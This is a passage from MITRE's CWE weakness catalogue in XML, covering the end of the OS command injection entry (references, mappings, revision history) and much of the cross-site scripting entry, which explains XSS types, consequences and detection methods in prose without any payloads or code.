               <Reference_Link>http://www.cgisecurity.com/lib/sips.html</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-17" Local_Reference_ID="R.78.6">
               <Reference_Author>Michael Howard</Reference_Author>
               <Reference_Author>David LeBlanc</Reference_Author>
               <Reference_Author>John Viega</Reference_Author>
               <Reference_Title>24 Deadly Sins of Software Security</Reference_Title>
               <Reference_Section>"Sin 10: Command Injection." Page 171</Reference_Section>
               <Reference_Publication>McGraw-Hill</Reference_Publication>
               <Reference_PubDate>2010</Reference_PubDate>
            </Reference>
            <Reference Local_Reference_ID="R.78.7">
               <Reference_Author>Frank Kim</Reference_Author>
               <Reference_Title>Top 25 Series - Rank 9 - OS Command Injection</Reference_Title>
               <Reference_Publisher>SANS Software Security Institute</Reference_Publisher>
               <Reference_Date>2010-02-24</Reference_Date>
               <Reference_Link>http://blogs.sans.org/appsecstreetfighter/2010/02/24/top-25-series-rank-9-os-command-injection/</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-21" Local_Reference_ID="R.78.8">
               <Reference_Author>OWASP</Reference_Author>
               <Reference_Title>OWASP Enterprise Security API (ESAPI) Project</Reference_Title>
               <Reference_Link>http://www.owasp.org/index.php/ESAPI</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-31" Local_Reference_ID="R.78.9">
               <Reference_Author>Sean Barnum</Reference_Author>
               <Reference_Author>Michael Gegick</Reference_Author>
               <Reference_Title>Least Privilege</Reference_Title>
               <Reference_PubDate>2005-09-14</Reference_PubDate>
               <Reference_Link>https://buildsecurityin.us-cert.gov/daisy/bsi/articles/knowledge/principles/351.html</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-7" Local_Reference_ID="R.78.10">
               <Reference_Author>Mark Dowd</Reference_Author>
               <Reference_Author>John McDonald</Reference_Author>
               <Reference_Author>Justin Schuh</Reference_Author>
               <Reference_Title>The Art of Software Security Assessment</Reference_Title>
               <Reference_Section>Chapter 8, "Shell Metacharacters", Page
						425.</Reference_Section>
               <Reference_Edition>1st Edition</Reference_Edition>
               <Reference_Publisher>Addison Wesley</Reference_Publisher>
               <Reference_PubDate>2006</Reference_PubDate>
            </Reference>
         </References>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="PLOVER">
               <Mapped_Node_Name>OS Command Injection</Mapped_Node_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="OWASP Top Ten 2007">
               <Mapped_Node_Name>Malicious File Execution</Mapped_Node_Name>
               <Mapped_Node_ID>A3</Mapped_Node_ID>
               <Mapping_Fit>CWE_More_Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="OWASP Top Ten 2004">
               <Mapped_Node_Name>Injection Flaws</Mapped_Node_Name>
               <Mapped_Node_ID>A6</Mapped_Node_ID>
               <Mapping_Fit>CWE_More_Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C Secure Coding">
               <Mapped_Node_Name>Sanitize the environment when invoking external
						programs</Mapped_Node_Name>
               <Mapped_Node_ID>ENV03-C</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C Secure Coding">
               <Mapped_Node_Name>Do not call system() if you do not need a command
						processor</Mapped_Node_Name>
               <Mapped_Node_ID>ENV04-C</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C Secure Coding">
               <Mapped_Node_Name>Sanitize data passed to complex subsystems</Mapped_Node_Name>
               <Mapped_Node_ID>STR02-C</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="WASC">
               <Mapped_Node_Name>OS Commanding </Mapped_Node_Name>
               <Mapped_Node_ID>31</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT Java Secure Coding">
               <Mapped_Node_Name>Do not pass untrusted, unsanitized data to the Runtime.exec()
						method</Mapped_Node_Name>
               <Mapped_Node_ID>IDS07-J</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C++ Secure Coding">
               <Mapped_Node_Name>Sanitize data passed to complex subsystems</Mapped_Node_Name>
               <Mapped_Node_ID>STR02-CPP</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C++ Secure Coding">
               <Mapped_Node_Name>Sanitize the environment when invoking external
						programs</Mapped_Node_Name>
               <Mapped_Node_ID>ENV03-CPP</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C++ Secure Coding">
               <Mapped_Node_Name>Do not call system() if you do not need a command
						processor</Mapped_Node_Name>
               <Mapped_Node_ID>ENV04-CPP</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="Software Fault Patterns">
               <Mapped_Node_Name>Tainted input to command</Mapped_Node_Name>
               <Mapped_Node_ID>SFP24</Mapped_Node_ID>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <White_Box_Definitions>
            <White_Box_Definition>
               <Text>A weakness where the code path has:</Text>
               <Block>
                  <Text>1. start statement that accepts input</Text>
                  <Text>2. end statement that executes an operating system command
							where</Text>
                  <Block>
                     <Text>a. the input is used as a part of the operating system command
								and</Text>
                     <Text>b. the operating system command is undesirable</Text>
                  </Block>
               </Block>
               <Text>Where "undesirable" is defined through the following scenarios:</Text>
               <Block>
                  <Text>1. not validated</Text>
                  <Text>2. incorrectly validated</Text>
               </Block>
            </White_Box_Definition>
         </White_Box_Definitions>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>108</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>15</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>43</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>6</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>88</CAPEC_ID>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Content_History>
            <Submission Submission_Source="Externally_Mined">
               <Submitter>PLOVER</Submitter>
            </Submission>
            <Modification Modification_Source="External">
               <Modifier>Sean Eidemiller</Modifier>
               <Modifier_Organization>Cigital</Modifier_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>added/updated demonstrative
						examples</Modification_Comment>
            </Modification>
            <Modification Modification_Source="External">
               <Modifier>Eric Dalci</Modifier>
               <Modifier_Organization>Cigital</Modifier_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification Modification_Source="External">
               <Modifier_Organization>KDM Analytics</Modifier_Organization>
               <Modification_Date>2008-08-01</Modification_Date>
               <Modification_Comment>added/updated white box definitions</Modification_Comment>
            </Modification>
            <Modification Modification_Source="External">
               <Modifier_Organization>Veracode</Modifier_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004
						mapping</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2008-11-24</Modification_Date>
               <Modification_Comment>updated Observed_Examples, Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples,
						Description, Likelihood_of_Exploit, Name, Observed_Examples, Other_Notes,
						Potential_Mitigations, Relationships, Research_Gaps,
						Terminology_Notes</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Name,
						Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification Modification_Source="External">
               <Modifier>KDM Analytics</Modifier>
               <Modification_Date>2009-07-17</Modification_Date>
               <Modification_Comment>Improved the White_Box_Definition</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Description, Name,
						White_Box_Definitions</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Observed_Examples,
						References</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Detection_Factors</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Potential_Mitigations,
						References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Description,
						Detection_Factors, Name, Observed_Examples, Potential_Mitigations,
						References, Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Description,
						Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples,
						Description</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References, Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, References, Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Observed_Examples,
						Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples,
						Terminology_Notes</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Previous_Entry_Names>
               <Previous_Entry_Name Name_Change_Date="2008-04-11">OS Command
						Injection</Previous_Entry_Name>
               <Previous_Entry_Name Name_Change_Date="2009-01-12">Failure to Sanitize Data into
						an OS Command (aka 'OS Command Injection')</Previous_Entry_Name>
               <Previous_Entry_Name Name_Change_Date="2009-05-27">Failure to Preserve OS
						Command Structure (aka 'OS Command Injection')</Previous_Entry_Name>
               <Previous_Entry_Name Name_Change_Date="2009-07-27">Failure to Preserve OS
						Command Structure ('OS Command Injection')</Previous_Entry_Name>
               <Previous_Entry_Name Name_Change_Date="2010-06-21">Improper Sanitization of
						Special Elements used in an OS Command ('OS Command
						Injection')</Previous_Entry_Name>
            </Previous_Entry_Names>
         </Content_History>
      </Weakness>
                    <Weakness ID="79" Name="Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')" Weakness_Abstraction="Base" Status="Usable">
         <Description>
            <Description_Summary>The software does not neutralize or incorrectly neutralizes
					user-controllable input before it is placed in output that is used as a web page
					that is served to other users.</Description_Summary>
            <Extended_Description>
               <Text>Cross-site scripting (XSS) vulnerabilities occur when:</Text>
               <Block>
                  <Text>1. Untrusted data enters a web application, typically from a web
							request.</Text>
                  <Text>2. The web application dynamically generates a web page that contains
							this untrusted data.</Text>
                  <Text>3. During page generation, the application does not prevent the data
							from containing content that is executable by a web browser, such as
							JavaScript, HTML tags, HTML attributes, mouse events, Flash, ActiveX,
							etc.</Text>
                  <Text>4. A victim visits the generated web page through a web browser, which
							contains malicious script that was injected using the untrusted
							data.</Text>
                  <Text>5. Since the script comes from a web page that was sent by the web
							server, the victim's web browser executes the malicious script in the
							context of the web server's domain.</Text>
                  <Text>6. This effectively violates the intention of the web browser's
							same-origin policy, which states that scripts in one domain should not
							be able to access resources or run code in a different domain.</Text>
               </Block>
               <Text>There are three main kinds of XSS:</Text>
               <Block>
                  <Text_Title>Type 1: Reflected XSS (or Non-Persistent)</Text_Title>
                  <Text>The server reads data directly from the HTTP request and reflects it
							back in the HTTP response. Reflected XSS exploits occur when an attacker
							causes a victim to supply dangerous content to a vulnerable web
							application, which is then reflected back to the victim and executed by
							the web browser. The most common mechanism for delivering malicious
							content is to include it as a parameter in a URL that is posted publicly
							or e-mailed directly to the victim. URLs constructed in this manner
							constitute the core of many phishing schemes, whereby an attacker
							convinces a victim to visit a URL that refers to a vulnerable site.
							After the site reflects the attacker's content back to the victim, the
							content is executed by the victim's browser.</Text>
               </Block>
               <Block>
                  <Text_Title>Type 2: Stored XSS (or Persistent)</Text_Title>
                  <Text>The application stores dangerous data in a database, message forum,
							visitor log, or other trusted data store. At a later time, the dangerous
							data is subsequently read back into the application and included in
							dynamic content. From an attacker's perspective, the optimal place to
							inject malicious content is in an area that is displayed to either many
							users or particularly interesting users. Interesting users typically
							have elevated privileges in the application or interact with sensitive
							data that is valuable to the attacker. If one of these users executes
							malicious content, the attacker may be able to perform privileged
							operations on behalf of the user or gain access to sensitive data
							belonging to the user. For example, the attacker might inject XSS into a
							log message, which might not be handled properly when an administrator
							views the logs. </Text>
               </Block>
               <Block>
                  <Text_Title>Type 0: DOM-Based XSS</Text_Title>
                  <Text>In DOM-based XSS, the client performs the injection of XSS into the
							page; in the other types, the server performs the injection. DOM-based
							XSS generally involves server-controlled, trusted script that is sent to
							the client, such as Javascript that performs sanity checks on a form
							before the user submits it. If the server-supplied script processes
							user-supplied data and then injects it back into the web page (such as
							with dynamic HTML), then DOM-based XSS is possible.</Text>
               </Block>
               <Text>Once the malicious script is injected, the attacker can perform a variety
						of malicious activities. The attacker could transfer private information,
						such as cookies that may include session information, from the victim's
						machine to the attacker. The attacker could send malicious requests to a web
						site on behalf of the victim, which could be especially dangerous to the
						site if the victim has administrator privileges to manage that site.
						Phishing attacks could be used to emulate trusted web sites and trick the
						victim into entering a password, allowing the attacker to compromise the
						victim's account on that web site. Finally, the script could exploit a
						vulnerability in the web browser itself possibly taking over the victim's
						machine, sometimes referred to as "drive-by hacking."</Text>
               <Text>In many cases, the attack can be launched without the victim even being
						aware of it. Even with careful users, attackers frequently use a variety of
						methods to encode the malicious portion of the attack, such as URL encoding
						or Unicode, so the request looks less suspicious.</Text>
            </Extended_Description>
         </Description>
         <Relationships>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">900</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>864</Relationship_Target_ID>
               <!--2011 Top 25 - Insecure Interaction Between Components--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">800</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>801</Relationship_Target_ID>
               <!--2010 Top 25 - Insecure Interaction Between Components--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">1000</Relationship_View_ID>
                  <Relationship_View_ID Ordinal="Primary">699</Relationship_View_ID>
                  <Relationship_View_ID Ordinal="Primary">1003</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>74</Relationship_Target_ID>
               <!--Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">711</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>725</Relationship_Target_ID>
               <!--OWASP Top Ten 2004 Category A4 - Cross-Site Scripting (XSS) Flaws--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>711</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>722</Relationship_Target_ID>
               <!--OWASP Top Ten 2004 Category A1 - Unvalidated Input--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>1000</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>CanPrecede</Relationship_Nature>
               <Relationship_Target_ID>494</Relationship_Target_ID>
               <!--Download of Code Without Integrity Check--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>1000</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Compound_Element</Relationship_Target_Form>
               <Relationship_Nature>PeerOf</Relationship_Nature>
               <Relationship_Target_ID>352</Relationship_Target_ID>
               <!--Cross-Site Request Forgery (CSRF)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>699</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>442</Relationship_Target_ID>
               <!--Web Problems--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">700</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>20</Relationship_Target_ID>
               <!--Improper Input Validation--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">629</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>712</Relationship_Target_ID>
               <!--OWASP Top Ten 2007 Category A1 - Cross Site Scripting (XSS)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">750</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>751</Relationship_Target_ID>
               <!--2009 Top 25 - Insecure Interaction Between Components--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">809</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>811</Relationship_Target_ID>
               <!--OWASP Top Ten 2010 Category A2 - Cross-Site Scripting (XSS)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">888</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>990</Relationship_Target_ID>
               <!--SFP Secondary Cluster: Tainted Input to Command--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">928</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>931</Relationship_Target_ID>
               <!--OWASP Top Ten 2013 Category A3 - Cross-Site Scripting (XSS)--></Relationship>
         </Relationships>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Resultant</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Languages>
               <Language_Class Language_Class_Description="Language-independent"/>
            </Languages>
            <Architectural_Paradigms>
               <Architectural_Paradigm Architectural_Paradigm_Name="Web-based" Prevalence="Often"/>
            </Architectural_Paradigms>
            <Technology_Classes>
               <Technology_Class Prevalence="Often" Technology_Name="Web-Server"/>
            </Technology_Classes>
            <Platform_Notes>
               <Text>XSS flaws are very common in web applications since they require a great
						deal of developer discipline to avoid them.</Text>
            </Platform_Notes>
         </Applicable_Platforms>
         <Background_Details>
            <Background_Detail>
               <Text_Title>Same Origin Policy</Text_Title>
               <Text>The same origin policy states that browsers should limit the resources
						accessible to scripts running on a given web site, or "origin", to the
						resources associated with that web site on the client-side, and not the
						client-side resources of any other sites or "origins". The goal is to
						prevent one site from being able to modify or read the contents of an
						unrelated site. Since the World Wide Web involves interactions between many
						sites, this policy is important for browsers to enforce.</Text>
               <Text_Title>Domain</Text_Title>
               <Text>The Domain of a website when referring to XSS is roughly equivalent to the
						resources associated with that website on the client-side of the connection.
						That is, the domain can be thought of as all resources the browser is
						storing for the user's interactions with this particular site.</Text>
            </Background_Detail>
         </Background_Details>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>XSS</Term>
            </Alternate_Term>
            <Alternate_Term>
               <Term>CSS</Term>
               <Alternate_Term_Description>
                  <Text>"CSS" was once used as the acronym for this problem, but this could
							cause confusion with "Cascading Style Sheets," so usage of this acronym
							has declined significantly.</Text>
               </Alternate_Term_Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Time_of_Introduction>
            <Introductory_Phase>Architecture and Design</Introductory_Phase>
            <Introductory_Phase>Implementation</Introductory_Phase>
         </Time_of_Introduction>
         <Enabling_Factors_for_Exploitation>
            <Enabling_Factor_for_Exploitation>
               <Text>Cross-site scripting attacks may occur anywhere that possibly malicious
						users are allowed to post unregulated material to a trusted web site for the
						consumption of other valid users, commonly on places such as bulletin-board
						web sites which provide web based mailing list-style functionality.</Text>
               <Text>Stored XSS got its start with web sites that offered a "guestbook" to
						visitors. Attackers would include JavaScript in their guestbook entries, and
						all subsequent visitors to the guestbook page would execute the malicious
						code. As the examples demonstrate, XSS vulnerabilities are caused by code
						that includes unvalidated data in an HTTP response.</Text>
            </Enabling_Factor_for_Exploitation>
         </Enabling_Factors_for_Exploitation>
         <Likelihood_of_Exploit>High to Very High</Likelihood_of_Exploit>
         <Common_Consequences>
            <Common_Consequence>
               <Consequence_Scope>Access_Control</Consequence_Scope>
               <Consequence_Scope>Confidentiality</Consequence_Scope>
               <Consequence_Technical_Impact>Bypass protection
						mechanism</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>Read application
						data</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>The most common attack performed with cross-site scripting involves
							the disclosure of information stored in user cookies. Typically, a
							malicious user will craft a client-side script, which -- when parsed by
							a web browser -- performs some activity (such as sending all site
							cookies to a given E-mail address). This script will be loaded and run
							by each user visiting the web site. Since the site requesting to run the
							script has access to the cookies in question, the malicious script does
							also.</Text>
               </Consequence_Note>
            </Common_Consequence>
            <Common_Consequence>
               <Consequence_Scope>Integrity</Consequence_Scope>
               <Consequence_Scope>Confidentiality</Consequence_Scope>
               <Consequence_Scope>Availability</Consequence_Scope>
               <Consequence_Technical_Impact>Execute unauthorized code or
						commands</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>In some circumstances it may be possible to run arbitrary code on a
							victim's computer when cross-site scripting is combined with other
							flaws.</Text>
               </Consequence_Note>
            </Common_Consequence>
            <Common_Consequence>
               <Consequence_Scope>Confidentiality</Consequence_Scope>
               <Consequence_Scope>Integrity</Consequence_Scope>
               <Consequence_Scope>Availability</Consequence_Scope>
               <Consequence_Scope>Access_Control</Consequence_Scope>
               <Consequence_Technical_Impact>Execute unauthorized code or
						commands</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>Bypass protection
						mechanism</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>Read application
						data</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>The consequence of an XSS attack is the same regardless of whether it
							is stored or reflected. The difference is in how the payload arrives at
							the server.</Text>
                  <Text>XSS can cause a variety of problems for the end user that range in
							severity from an annoyance to complete account compromise. Some
							cross-site scripting vulnerabilities can be exploited to manipulate or
							steal cookies, create requests that can be mistaken for those of a valid
							user, compromise confidential information, or execute malicious code on
							the end user systems for a variety of nefarious purposes. Other damaging
							attacks include the disclosure of end user files, installation of Trojan
							horse programs, redirecting the user to some other page or site, running
							"Active X" controls (under Microsoft Internet Explorer) from sites that
							a user perceives as trustworthy, and modifying presentation of
							content.</Text>
               </Consequence_Note>
            </Common_Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method_Name>Automated Static Analysis</Method_Name>
               <Method_Description>
                  <Text>Use automated static analysis tools that target this type of weakness.
							Many modern techniques use data flow analysis to minimize the number of
							false positives. This is not a perfect solution, since 100% accuracy and
							coverage are not feasible, especially when multiple components are
							involved.</Text>
               </Method_Description>
               <Method_Effectiveness>Moderate</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Black Box</Method_Name>
               <Method_Description>
                  <Text>Use the XSS Cheat Sheet [R.79.6] or automated test-generation tools to
							help launch a wide variety of attacks against your web application. The
							Cheat Sheet contains many subtle XSS variations that are specifically
							targeted against weak XSS defenses.</Text>
               </Method_Description>
               <Method_Effectiveness>Moderate</Method_Effectiveness>
               <Method_Effectiveness_Notes>
                  <Text>With Stored XSS, the indirection caused by the data store can make it
							more difficult to find the problem. The tester must first inject the XSS
							string into the data store, then find the appropriate application
							functionality in which the XSS string is sent to other users of the
							application. These are two distinct steps in which the activation of the
							XSS can take place minutes, hours, or days after the XSS was originally
							injected into the data store.</Text>
               </Method_Effectiveness_Notes>
            </Detection_Method>
